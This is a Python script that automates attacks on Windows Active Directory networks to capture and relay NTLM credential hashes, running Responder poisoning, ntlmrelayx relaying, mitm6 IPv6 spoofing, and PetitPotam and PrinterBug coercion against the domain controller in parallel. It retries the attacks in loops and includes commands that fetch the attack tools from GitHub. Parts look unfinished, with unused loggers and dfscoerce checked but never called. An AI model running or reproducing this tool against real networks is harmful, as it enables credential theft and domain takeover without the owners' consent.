#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, domain=None, verbose=True):
        self.interface = interface
        self.domain = domain
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()

        # Get the global logger instance
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug"),
            "adcs_relay": logging.getLogger("adcs_relay"),
            "webdav_relay": logging.getLogger("webdav_relay"),
            "sccm_relay": logging.getLogger("sccm_relay")
        }

        # Configure attack loggers with console output
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(console_handler)
            # Add file handler
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)
        
        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def check_dependencies(self):
        """Check if all required tools and modules are installed and accessible"""
        missing_tools = []
        missing_modules = []
        
        installation_guide = {
            "responder": "apt install responder",
            "ntlmrelayx.py": "pip3 install impacket",
            "mitm6": "pip3 install mitm6",
            "netexec": "pip3 install netexec",
            "nslookup": "apt install dnsutils",
            "petitpotam.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/topotam/PetitPotam.git && ln -s /opt/tools/PetitPotam/PetitPotam.py /usr/local/bin/petitpotam.py && chmod +x /usr/local/bin/petitpotam.py",
            "printerbug.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/dirkjanm/krbrelayx.git && ln -s /opt/tools/krbrelayx/printerbug.py /usr/local/bin/printerbug.py && chmod +x /usr/local/bin/printerbug.py",
            "dfscoerce.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/Wh04m1001/DFSCoerce.git && ln -s /opt/tools/DFSCoerce/dfscoerce.py /usr/local/bin/dfscoerce.py && chmod +x /usr/local/bin/dfscoerce.py"
        }

        required_modules = [
            'netifaces',
            'ipaddress',
            'scapy',
            'twisted',
            'impacket',
            'ldap3',
            'cryptography',
            'dsinternals'
        ]

        # Check Python modules
        self.logger.info("Checking required Python modules...")
        for module in required_modules:
            try:
                __import__(module)
                self.logger.debug(f"Module {module} is installed")
            except ImportError:
                missing_modules.append(module)
                self.logger.error(f"Module {module} is missing")

        # Check command line tools
        self.logger.info("Checking required command line tools...")
        for tool in installation_guide.keys():
            if not shutil.which(tool):
                missing_tools.append(tool)
                self.logger.error(f"Tool {tool} is missing")
            else:
                self.logger.debug(f"Tool {tool} is installed")

        if len(missing_tools) > 0 or len(missing_modules) > 0:
            self.logger.error("Missing dependencies. Please install required tools and modules.")
            if len(missing_tools) > 0:
                self.logger.error(f"Missing tools: {', '.join(missing_tools)}")
            if len(missing_modules) > 0:
                self.logger.error(f"Missing modules: {', '.join(missing_modules)}")
            return False

        # Check if running as root
        if os.geteuid() != 0:
            self.logger.error("Script must be run as root")
            return False

        return True

    def get_local_ip(self):
        """Get IP address for specified interface"""
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            self.logger.error(f"Failed to get IP for interface {self.interface}: {e}")
            return None

    def get_dc_ip(self):
        """Get domain controller IP address"""
        try:
            if self.domain:
                cmd = f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{self.domain}"
                output = subprocess.check_output(cmd.split(), universal_newlines=True)
                dc_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', output)
                if dc_ips:
                    return dc_ips[0]
        except Exception as e:
            self.logger.error(f"Failed to get DC IP: {e}")
        return None

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info("Shutting down...")
        self.stop_event.set()
        self.cleanup()

    def process_output(self, process, logger, name):
        """Helper function to process output from attack processes"""
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                line = line.decode('utf-8').strip()
                logger.info(f"{name}: {line}")

    def run_attack_thread(self, attack_func):
        """Run an attack in a separate thread with improved monitoring"""
        try:
            self.logger.info(f"Starting attack thread: {attack_func.__name__}")
            while not self.stop_event.is_set():
                if not attack_func():
                    self.logger.warning(f"Attack {attack_func.__name__} failed, retrying in 30 seconds")
                    time.sleep(30)  # Wait before retrying
                time.sleep(1)
        except Exception as e:
            self.logger.error(f"Error in attack thread {attack_func.__name__}: {e}")

    def cleanup(self):
        """Clean up running processes"""
        self.logger.info("Cleaning up processes")
        for name, process in self.processes.items():
            try:
                self.logger.info(f"Terminating {name}")
                process.terminate()
                process.wait(timeout=5)
            except Exception as e:
                self.logger.error(f"Error cleaning up {name}: {e}")
                try:
                    process.kill()
                except:
                    pass

    def create_targets_file(self):
        """Create the targets file for ntlmrelayx"""
        try:
            with open("targets.txt", "w") as f:
                f.write(f"{self.local_ip}\n")
                if self.domain:
                    dc_ip = self.get_dc_ip()
                    if dc_ip:
                        f.write(f"{dc_ip}\n")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create targets file: {e}")
            return False

    def start_ntlmrelay(self):
        """Start NTLM relay attack with improved output handling"""
        try:
            cmd = [
                "ntlmrelayx.py",
                "-tf", "targets.txt",
                "-smb2support",
                "-socks",
                "-debug"
            ]
            
            if self.domain:
                cmd.extend([
                    "-domain", self.domain,
                    "-wh", self.local_ip
                ])
            
            self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
            self.processes["ntlmrelay"] = process
            
            # Start output processing in a separate thread
            output_thread = Thread(target=self.process_output, 
                                 args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay"))
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_ntlmrelay: {e}")
            return False

    def start_responder(self):
        """Start Responder attack"""
        try:
            cmd = [
                "responder",
                "-I", self.interface,
                "-wrf",
                "-v"  # Add verbose flag
            ]

            if self.domain:
                cmd.extend([
                    "-r", f"ldaps://{self.domain}"
                ])

            self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
            self.processes["responder"] = process

            # Start output processing in a separate thread
            output_thread = Thread(target=self.process_output,
                                 args=(process, self.attack_loggers["responder"], "Responder"))
            output_thread.daemon = True
            output_thread.start()

            return True
        except Exception as e:
            self.logger.error(f"Error in start_responder: {e}")
            return False

    def start_mitm6(self):
        """Start mitm6 attack"""
        try:
            cmd = ["mitm6", "-i", self.interface, "-v"]  # Add verbose flag
            
            if self.domain:
                cmd.extend(["-d", self.domain])
            
            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
            self.processes["mitm6"] = process

            # Start output processing in a separate thread
            output_thread = Thread(target=self.process_output,
                                 args=(process, self.attack_loggers["mitm6"], "MITM6"))
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def start_petitpotam(self):
        """Start PetitPotam attack"""
        try:
            if not self.domain or not self.get_dc_ip():
                self.logger.warning("PetitPotam attack requires a valid domain")
                return False

            cmd = [
                "petitpotam.py",
                "-d", self.domain,
                "-u", "anonymous",
                "-target", self.get_dc_ip(),
                "-debug"  # Add debug flag if available
            ]
            
            self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
            self.processes["petitpotam"] = process

            # Start output processing in a separate thread
            output_thread = Thread(target=self.process_output,
                                 args=(process, self.attack_loggers["petitpotam"], "PetitPotam"))
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_petitpotam: {e}")
            return False

    def start_printerbug(self):
        """Start PrinterBug attack"""
        try:
            if not self.domain or not self.get_dc_ip():
                self.logger.warning("PrinterBug attack requires a valid domain")
                return False

            cmd = [
                "printerbug.py",
                f"{self.domain}/anonymous",
                self.get_dc_ip(),
                "-no-pass"
            ]
            
            self.logger.info(f"Starting PrinterBug with command: {' '.join(cmd)}")
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, bufsize=1, universal_newlines=True)
            self.processes["printerbug"] = process

            # Start output processing in a separate thread
            output_thread = Thread(target=self.process_output,
                                 args=(process, self.attack_loggers["printerbug"], "PrinterBug"))
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_printerbug: {e}")
            return False

# Part 2 to fix indents
    def run(self):
        """Main execution flow running all attacks simultaneously with improved monitoring"""
        self.logger.info("Starting Hash Capture Operation")
        
        # Run dependency checks
        self.logger.info("Running system and dependency checks...")
        if not self.check_dependencies():
            self.logger.error("Dependency checks failed")
            return False
        
        # Create targets file if domain is specified
        if self.domain:
            if not self.create_targets_file():
                self.logger.error("Failed to create targets file")
                return False
        
        try:
            # List of attacks to run
            attacks = [
                ("NTLM Relay", self.start_ntlmrelay),
                ("Responder", self.start_responder),
                ("MITM6", self.start_mitm6),
                ("PetitPotam", self.start_petitpotam),
                ("PrinterBug", self.start_printerbug)
            ]

            # Tracking failed attacks
            failed_attacks = []

            # Start each attack in its own thread
            for attack_name, attack_func in attacks:
                try:
                    self.logger.info(f"Launching {attack_name} attack...")
                    thread = Thread(target=self.run_attack_thread, args=(attack_func,))
                    thread.daemon = True
                    thread.start()
                    self.attack_threads.append(thread)
                    self.logger.info(f"{attack_name} attack thread started successfully")
                except Exception as e:
                    self.logger.error(f"Failed to start {attack_name} attack: {e}")
                    failed_attacks.append(attack_name)

            if failed_attacks:
                self.logger.warning(f"Failed to start the following attacks: {', '.join(failed_attacks)}")

            self.logger.info("All attacks initiated. Monitoring for results...")

            # Monitor attack threads and keep main thread alive
            try:
                while not self.stop_event.is_set():
                    # Log active threads every minute
                    active_threads = [t.name for t in self.attack_threads if t.is_alive()]
                    self.logger.debug(f"Active attack threads: {', '.join(active_threads) or 'None'}")
                    time.sleep(60)
            except KeyboardInterrupt:
                self.logger.info("Received interrupt signal, shutting down...")
                self.stop_event.set()

        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
            return False
        finally:
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description="Enhanced Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.domain, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
